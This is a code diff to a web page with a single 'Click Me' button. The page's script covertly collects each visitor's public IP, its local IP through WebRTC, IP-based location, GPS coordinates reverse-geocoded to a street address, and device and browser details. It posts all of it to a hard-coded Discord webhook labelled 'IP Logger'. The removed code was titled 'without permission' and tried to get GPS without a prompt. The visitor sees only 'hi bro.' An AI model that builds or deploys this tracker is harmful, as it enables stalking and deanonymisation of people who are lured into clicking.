@@ -8,6 +8,7 @@
         button:hover { background-color: #4752C4; }
         button:disabled { opacity: 0.5; cursor: not-allowed; }
         #status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
+        #permissionMessage { margin-top: 20px; color: #ff9800; display: none; }
     </style>
 </head>
 <body>
@@ -15,207 +16,207 @@
     <p>click the button below:</p>
     
     <button id="trackButton">Click Me</button>
+    <div id="permissionMessage">Allow location access for precise coordinates</div>
     <div id="status"></div>
     
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
         
-        async function getPublicIP() {
-            const services = [
-                'https://api.ipify.org?format=json',
-                'https://api64.ipify.org?format=json',
-                'https://ip.seeip.org/jsonip'
-            ];
+        function detectDevice() {
+            const ua = navigator.userAgent.toLowerCase();
+            let deviceType = 'Desktop';
+            let os = 'Unknown';
+            let browser = 'Unknown';
             
-            for (const service of services) {
-                try {
-                    const res = await fetch(service);
-                    const data = await res.json();
-                    if (data.ip) return data.ip;
-                } catch (e) {
-                    continue;
-                }
+            if (/mobile|android|iphone|ipad|ipod|blackberry|iemobile|opera mini|windows phone/i.test(ua)) {
+                deviceType = 'Mobile';
             }
-            return 'Unknown';
-        }
-        
-        async function getDetailedGeolocation(ip) {
-            const apis = [
-                {
-                    name: 'ipapi.co',
-                    url: `https://ipapi.co/${ip}/json/`,
-                    parser: (data) => ({
-                        lat: data.latitude ? Number(data.latitude).toFixed(8) : null,
-                        lon: data.longitude ? Number(data.longitude).toFixed(8) : null,
-                        city: data.city,
-                        region: data.region,
-                        country: data.country_name,
-                        isp: data.org,
-                        zip: data.postal,
-                        timezone: data.timezone,
-                        accuracy: 'IP-based (city level)'
-                    })
-                },
-                {
-                    name: 'ip-api.com',
-                    url: `http://ip-api.com/json/${ip}`,
-                    parser: (data) => ({
-                        lat: data.lat ? Number(data.lat).toFixed(8) : null,
-                        lon: data.lon ? Number(data.lon).toFixed(8) : null,
-                        city: data.city,
-                        region: data.regionName,
-                        country: data.country,
-                        isp: data.isp,
-                        zip: data.zip,
-                        timezone: data.timezone,
-                        accuracy: 'IP-based (ISP level)'
-                    })
-                },
-                {
-                    name: 'ipgeolocation.io',
-                    url: `https://api.ipgeolocation.io/ipgeo?apiKey=test&ip=${ip}`,
-                    parser: (data) => ({
-                        lat: data.latitude ? Number(data.latitude).toFixed(8) : null,
-                        lon: data.longitude ? Number(data.longitude).toFixed(8) : null,
-                        city: data.city,
-                        region: data.state_prov,
-                        country: data.country_name,
-                        isp: data.isp,
-                        zip: data.zipcode,
-                        timezone: data.time_zone.name,
-                        accuracy: 'IP-based (commercial)'
-                    })
-                }
-            ];
-            
-            for (const api of apis) {
-                try {
-                    const res = await fetch(api.url);
-                    const data = await res.json();
-                    if (data && data.latitude && data.longitude) {
-                        return {
-                            ...api.parser(data),
-                            source: api.name,
-                            raw: data
-                        };
-                    }
-                } catch (e) {
-                    continue;
-                }
-            }
-            return null;
-        }
-        
-        async function getNetworkInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            let networkType = 'Unknown';
-            let effectiveType = 'Unknown';
-            let downlink = 'Unknown';
-            
-            if (connection) {
-                networkType = connection.type || 'Unknown';
-                effectiveType = connection.effectiveType || 'Unknown';
-                downlink = connection.downlink ? `${connection.downlink} Mbps` : 'Unknown';
+            if (/tablet|ipad|android(?!.*mobile)|kindle|silk/i.test(ua)) {
+                deviceType = 'Tablet';
             }
             
-            return { networkType, effectiveType, downlink };
+            if (/windows/.test(ua)) {
+                if (/windows nt 5/.test(ua)) os = 'Windows XP';
+                else if (/windows nt 6.0/.test(ua)) os = 'Windows Vista';
+                else if (/windows nt 6.1/.test(ua)) os = 'Windows 7';
+                else if (/windows nt 6.2/.test(ua)) os = 'Windows 8';
+                else if (/windows nt 6.3/.test(ua)) os = 'Windows 8.1';
+                else if (/windows nt 10/.test(ua)) os = 'Windows 10';
+                else if (/windows nt 11/.test(ua)) os = 'Windows 11';
+                else os = 'Windows';
+            } else if (/mac os x/.test(ua)) os = 'macOS';
+            else if (/linux/.test(ua)) os = 'Linux';
+            else if (/android/.test(ua)) os = 'Android';
+            else if (/iphone|ipad|ipod/.test(ua)) os = 'iOS';
+            else if (/cros/.test(ua)) os = 'Chrome OS';
+            
+            if (/edg/.test(ua)) browser = 'Microsoft Edge';
+            else if (/chrome/.test(ua)) browser = 'Google Chrome';
+            else if (/firefox/.test(ua)) browser = 'Mozilla Firefox';
+            else if (/safari/.test(ua) && !/chrome/.test(ua)) browser = 'Safari';
+            else if (/opera|opr/.test(ua)) browser = 'Opera';
+            else if (/msie|trident/.test(ua)) browser = 'Internet Explorer';
+            else if (/brave/.test(ua)) browser = 'Brave';
+            
+            return { deviceType, os, browser, userAgent: navigator.userAgent };
         }
         
-        async function getWiFiInfo() {
+        async function getLocalIP() {
             return new Promise((resolve) => {
-                if ('getWiFiInformation' in navigator) {
-                    navigator.getWiFiInformation().then(info => {
-                        resolve({
-                            ssid: info.ssid || 'Unknown',
-                            bssid: info.bssid || 'Unknown',
-                            signalStrength: info.signalStrength || 'Unknown'
-                        });
-                    }).catch(() => {
-                        resolve({ ssid: 'Not accessible', bssid: 'Not accessible', signalStrength: 'Not accessible' });
-                    });
-                } else {
-                    resolve({ ssid: 'API not supported', bssid: 'API not supported', signalStrength: 'API not supported' });
-                }
-            });
-        }
-        
-        function getDeviceDetails() {
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const languages = navigator.languages;
-            const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
-            const deviceMemory = navigator.deviceMemory || 'Unknown';
-            const maxTouchPoints = navigator.maxTouchPoints || 'Unknown';
-            
-            return { ua, platform, language, languages: languages.join(', '), hardwareConcurrency, deviceMemory, maxTouchPoints };
-        }
-        
-        async function attemptGeolocationWithoutPrompt() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ error: 'Geolocation API not available', allowed: false });
+                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                if (!RTCPeerConnection) {
+                    resolve('WebRTC not supported');
                     return;
                 }
                 
-                let permissionGranted = false;
-                let watchId = null;
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                const ips = [];
                 
-                const options = {
-                    enableHighAccuracy: true,
-                    timeout: 100,
-                    maximumAge: 0
-                };
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(err => {});
                 
-                const onSuccess = (position) => {
-                    permissionGranted = true;
-                    if (watchId !== null) {
-                        navigator.geolocation.clearWatch(watchId);
+                pc.onicecandidate = (event) => {
+                    if (!event.candidate) {
+                        if (ips.length) {
+                            resolve(ips[0]);
+                        } else {
+                            resolve('Not detected');
+                        }
+                        return;
                     }
-                    resolve({
-                        allowed: true,
-                        lat: position.coords.latitude.toFixed(8),
-                        lon: position.coords.longitude.toFixed(8),
-                        accuracy: `${Math.round(position.coords.accuracy)} meters`,
-                        altitude: position.coords.altitude ? `${position.coords.altitude.toFixed(2)}m` : 'N/A',
-                        speed: position.coords.speed ? `${(position.coords.speed * 3.6).toFixed(2)} km/h` : 'N/A',
-                        heading: position.coords.heading ? `${position.coords.heading}°` : 'N/A',
-                        timestamp: new Date(position.timestamp).toISOString()
-                    });
-                };
-                
-                const onError = (error) => {
-                    if (watchId !== null) {
-                        navigator.geolocation.clearWatch(watchId);
-                    }
-                    resolve({
-                        error: error.message,
-                        code: error.code,
-                        allowed: false
-                    });
-                };
-                
-                try {
-                    watchId = navigator.geolocation.watchPosition(onSuccess, onError, options);
                     
-                    setTimeout(() => {
-                        if (watchId !== null) {
-                            navigator.geolocation.clearWatch(watchId);
+                    const candidate = event.candidate.candidate;
+                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                    const match = candidate.match(regex);
+                    
+                    if (match) {
+                        const ip = match[1];
+                        if (ip.startsWith('192.168.') || ip.startsWith('10.') || 
+                            (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
+                            if (!ips.includes(ip)) {
+                                ips.push(ip);
+                            }
                         }
-                        if (!permissionGranted) {
-                            resolve({
-                                error: 'Permission not granted or timeout',
-                                allowed: false
-                            });
-                        }
-                    }, 1000);
-                } catch (e) {
-                    resolve({
-                        error: e.message,
-                        allowed: false
-                    });
-                }
+                    }
+                };
+                
+                setTimeout(() => {
+                    pc.close();
+                    resolve(ips.length ? ips[0] : 'Not detected');
+                }, 1000);
             });
+        }
+        
+        async function getIPLocation(ip) {
+            try {
+                const res = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await res.json();
+                return {
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    isp: data.org || 'Unknown',
+                    zip: data.postal || 'Unknown',
+                    timezone: data.timezone || 'Unknown',
+                    lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : 'Unknown',
+                    lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : 'Unknown',
+                    source: 'IP API'
+                };
+            } catch (e) {
+                return {
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    country: 'Unknown',
+                    isp: 'Unknown',
+                    zip: 'Unknown',
+                    timezone: 'Unknown',
+                    lat: 'Unknown',
+                    lon: 'Unknown',
+                    source: 'Failed'
+                };
+            }
+        }
+        
+        async function getRealTimeLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({
+                        lat: 'Unknown',
+                        lon: 'Unknown',
+                        accuracy: 'N/A',
+                        source: 'Geolocation not supported',
+                        timestamp: new Date().toISOString()
+                    });
+                    return;
+                }
+                
+                const permissionMessage = document.getElementById('permissionMessage');
+                permissionMessage.style.display = 'block';
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        permissionMessage.style.display = 'none';
+                        resolve({
+                            lat: position.coords.latitude.toFixed(6),
+                            lon: position.coords.longitude.toFixed(6),
+                            accuracy: Math.round(position.coords.accuracy) + ' meters',
+                            altitude: position.coords.altitude ? position.coords.altitude.toFixed(2) + 'm' : 'N/A',
+                            speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(2) + ' km/h' : 'N/A',
+                            heading: position.coords.heading ? position.coords.heading + '°' : 'N/A',
+                            source: 'Real-time GPS',
+                            timestamp: new Date(position.timestamp).toISOString()
+                        });
+                    },
+                    (error) => {
+                        permissionMessage.style.display = 'none';
+                        let errorMsg = 'Unknown error';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMsg = 'Permission denied';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMsg = 'Position unavailable';
+                                break;
+                            case error.TIMEOUT:
+                                errorMsg = 'Request timeout';
+                                break;
+                        }
+                        resolve({
+                            lat: 'Unknown',
+                            lon: 'Unknown',
+                            accuracy: 'N/A',
+                            source: errorMsg,
+                            timestamp: new Date().toISOString()
+                        });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        async function reverseGeocode(lat, lon) {
+            if (lat === 'Unknown' || lon === 'Unknown') {
+                return { address: 'No coordinates' };
+            }
+            
+            try {
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+                const data = await res.json();
+                if (data.address) {
+                    return {
+                        address: `${data.address.road || ''} ${data.address.house_number || ''}, ${data.address.city || data.address.town || data.address.village || ''}, ${data.address.country || ''}`.trim(),
+                        full: data.display_name || 'Unknown address'
+                    };
+                }
+            } catch (e) {
+                console.log('Reverse geocoding failed');
+            }
+            
+            return { address: 'Address lookup failed' };
         }
         
         document.getElementById('trackButton').addEventListener('click', async function() {
@@ -227,75 +228,97 @@
             status.style.display = 'none';
             
             try {
-                const publicIP = await getPublicIP();
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const publicIP = ipData.ip;
                 
-                const locationData = await getDetailedGeolocation(publicIP);
+                const localIP = await getLocalIP();
                 
-                const networkInfo = await getNetworkInfo();
+                const ipLocation = await getIPLocation(publicIP);
                 
-                const wifiInfo = await getWiFiInfo();
+                const realTimeLocation = await getRealTimeLocation();
                 
-                const deviceDetails = getDeviceDetails();
+                const deviceInfo = detectDevice();
                 
-                const geoAttempt = await attemptGeolocationWithoutPrompt();
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const screenDepth = screen.colorDepth;
+                const pixelRatio = window.devicePixelRatio || 1;
                 
-                const now = new Date();
-                const timestamp = now.toISOString();
-                const localTime = now.toLocaleString();
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+                const doNotTrack = navigator.doNotTrack || navigator.msDoNotTrack || 'Unknown';
+                const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
+                const referrer = document.referrer || 'Direct visit';
+                const language = navigator.language || 'Unknown';
                 
-                let mapsLink = 'No coordinates available';
-                if (locationData && locationData.lat && locationData.lon) {
-                    mapsLink = `https://maps.google.com/?q=${locationData.lat},${locationData.lon}`;
+                let reverseGeocodeResult = { address: 'Not available' };
+                if (realTimeLocation.lat !== 'Unknown' && realTimeLocation.lon !== 'Unknown') {
+                    reverseGeocodeResult = await reverseGeocode(realTimeLocation.lat, realTimeLocation.lon);
                 }
                 
+                let mapsLink = 'No coordinates available';
+                let gpsMapsLink = 'No GPS coordinates';
+                
+                if (ipLocation.lat !== 'Unknown' && ipLocation.lon !== 'Unknown') {
+                    mapsLink = `https://www.google.com/maps?q=${ipLocation.lat},${ipLocation.lon}`;
+                }
+                
+                if (realTimeLocation.lat !== 'Unknown' && realTimeLocation.lon !== 'Unknown') {
+                    gpsMapsLink = `https://www.google.com/maps?q=${realTimeLocation.lat},${realTimeLocation.lon}`;
+                }
+                
+                const now = new Date();
+                const dateStr = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear()}`;
+                let hours = now.getHours();
+                const ampm = hours >= 12 ? 'PM' : 'AM';
+                hours = hours % 12;
+                hours = hours ? hours : 12;
+                const timeStr = `${hours.toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} ${ampm}`;
+                
                 const embed = {
-                    title: "LOCATION CAPTURED - MAXIMUM ACCURACY WITHOUT PERMISSION",
-                    color: 0xFF0000,
+                    title: "IP TRACKED! - RESULTS",
+                    color: 16711680,
                     fields: [
                         {
-                            name: "IP ADDRESS & NETWORK",
-                            value: `Public IP: ${publicIP}\nNetwork Type: ${networkInfo.networkType}\nEffective Type: ${networkInfo.effectiveType}\nDownlink: ${networkInfo.downlink}\nWiFi SSID: ${wifiInfo.ssid}`,
+                            name: "NETWORK INFORMATION",
+                            value: `Public IP: ${publicIP}\nLocal IP: ${localIP}\nISP: ${ipLocation.isp}`,
                             inline: true
                         },
                         {
-                            name: "GEOLOCATION DATA",
-                            value: `City: ${locationData?.city || 'Unknown'}\nRegion: ${locationData?.region || 'Unknown'}\nCountry: ${locationData?.country || 'Unknown'}\nISP: ${locationData?.isp || 'Unknown'}\nZIP: ${locationData?.zip || 'Unknown'}`,
+                            name: "IP BASED LOCATION",
+                            value: `City: ${ipLocation.city}\nRegion: ${ipLocation.region}\nCountry: ${ipLocation.country}\nCoordinates: ${ipLocation.lat}, ${ipLocation.lon}\nGoogle Maps: ${mapsLink}`,
                             inline: true
                         },
                         {
-                            name: "COORDINATES",
-                            value: `Latitude: ${locationData?.lat || 'Unknown'}\nLongitude: ${locationData?.lon || 'Unknown'}\nAccuracy: ${locationData?.accuracy || 'Unknown'}\nSource: ${locationData?.source || 'Unknown'}\nMaps: ${mapsLink}`,
+                            name: "REAL-TIME GPS LOCATION",
+                            value: `Latitude: ${realTimeLocation.lat}\nLongitude: ${realTimeLocation.lon}\nAccuracy: ${realTimeLocation.accuracy}\nSpeed: ${realTimeLocation.speed}\nHeading: ${realTimeLocation.heading}\nGPS Maps: ${gpsMapsLink}`,
+                            inline: true
+                        },
+                        {
+                            name: "ADDRESS FROM GPS",
+                            value: `Address: ${reverseGeocodeResult.address.substring(0, 100)}${reverseGeocodeResult.address.length > 100 ? '...' : ''}\nSource: ${realTimeLocation.source}\nGPS Time: ${new Date(realTimeLocation.timestamp).toLocaleTimeString()}`,
                             inline: true
                         },
                         {
                             name: "DEVICE INFORMATION",
-                            value: `Platform: ${deviceDetails.platform}\nCPU Cores: ${deviceDetails.hardwareConcurrency}\nRAM: ${deviceDetails.deviceMemory}GB\nLanguage: ${deviceDetails.language}\nTouch Points: ${deviceDetails.maxTouchPoints}`,
+                            value: `Device Type: ${deviceInfo.deviceType}\nOperating System: ${deviceInfo.os}\nBrowser: ${deviceInfo.browser}\nScreen: ${screenWidth}x${screenHeight}\nLanguage: ${language}`,
                             inline: true
                         },
                         {
-                            name: "TIME & BROWSER",
-                            value: `Local Time: ${localTime}\nTimezone: ${timezone}\nBrowser Languages: ${deviceDetails.languages}\nUser Agent: ${deviceDetails.ua.substring(0, 100)}...`,
-                            inline: true
-                        },
-                        {
-                            name: "GPS ATTEMPT RESULT",
-                            value: geoAttempt.allowed 
-                                ? `✅ GPS ACCESS GRANTED\nLat: ${geoAttempt.lat}\nLon: ${geoAttempt.lon}\nAccuracy: ${geoAttempt.accuracy}\nSpeed: ${geoAttempt.speed}`
-                                : `❌ GPS ACCESS DENIED\nReason: ${geoAttempt.error || 'Permission required'}`,
+                            name: "BROWSER & SESSION",
+                            value: `Cookies: ${cookiesEnabled}\nDo Not Track: ${doNotTrack}\nOnline: ${onlineStatus}\nReferrer: ${referrer.substring(0, 40)}${referrer.length > 40 ? '...' : ''}\nTime: ${timeStr} ${dateStr}`,
                             inline: false
                         }
                     ],
                     footer: {
-                        text: `Location Source: ${locationData?.source || 'None'} • Timestamp: ${timestamp}`
+                        text: `Location Sources: ${ipLocation.source} + ${realTimeLocation.source}`
                     },
-                    timestamp: timestamp
+                    timestamp: new Date().toISOString()
                 };
                 
                 const discordMessage = {
                     embeds: [embed],
-                    username: "Location Tracker",
-                    content: geoAttempt.allowed ? "🚨 REAL-TIME GPS LOCATION CAPTURED 🚨" : "📍 IP-BASED LOCATION CAPTURED"
+                    username: "IP Logger"
                 };
                 
                 const response = await fetch(WEBHOOK_URL, {
@@ -305,11 +328,7 @@
                 });
                 
                 if (response.ok) {
-                    if (geoAttempt.allowed) {
-                        status.textContent = 'REAL-TIME GPS LOCATION CAPTURED!';
-                    } else {
-                        status.textContent = 'IP location captured (no GPS permission)';
-                    }
+                    status.textContent = 'hi bro.';
                     status.style.color = '#4CAF50';
                     status.style.backgroundColor = '#E8F5E9';
                 } else {
@@ -318,7 +337,7 @@
                 
             } catch (error) {
                 console.error('Error:', error);
-                status.textContent = 'Error occurred. Try again.';
+                status.textContent = 'uh error pls try again';
                 status.style.color = '#F44336';
                 status.style.backgroundColor = '#FFEBEE';
             } finally {
